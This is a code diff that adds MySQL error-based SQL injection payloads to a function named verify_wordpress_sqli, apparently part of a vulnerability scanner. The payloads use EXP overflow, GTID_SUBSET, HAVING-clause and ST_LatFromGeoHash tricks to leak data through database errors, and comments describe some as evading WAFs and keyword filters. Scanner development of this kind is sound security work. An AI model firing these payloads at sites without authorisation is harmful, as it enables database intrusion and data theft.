@@ -8071,6 +8071,15 @@ def verify_wordpress_sqli(
             (f"{orig_value}' AND updatexml(1,concat(0x7e,version()),1) AND '1",),
             (f"{orig_value}') AND extractvalue(1,concat(0x7e,version())) AND ('1",),
             (f"{orig_value}') AND updatexml(1,concat(0x7e,version()),1) AND ('1",),
+            # EXP(~(SELECT*FROM(SELECT version())x)) — overflow error leaks result, WAF-distinct
+            (f"{orig_value}' AND EXP(~(SELECT*FROM(SELECT version())x))-- -",),
+            (f"{orig_value}' OR EXP(~(SELECT*FROM(SELECT version())x))-- -",),
+            # GTID_SUBSET() — integer overflow, MySQL 5.6.5+
+            (f"{orig_value}' AND GTID_SUBSET(concat(0x7e,version()),0)-- -",),
+            # HAVING clause injection — when param is in a HAVING (not WHERE) context
+            (f"{orig_value}' HAVING extractvalue(1,concat(0x7e,version()))-- -",),
+            # ST_LatFromGeoHash — geometric function error, bypasses keyword filters
+            (f"{orig_value}' AND ST_LatFromGeoHash(concat(0x7e,version()))-- -",),
         ]
         for ctx in contexts:
             for fn in ("extractvalue(1,concat(0x7e,version()))", "updatexml(1,concat(0x7e,version()),1)"):
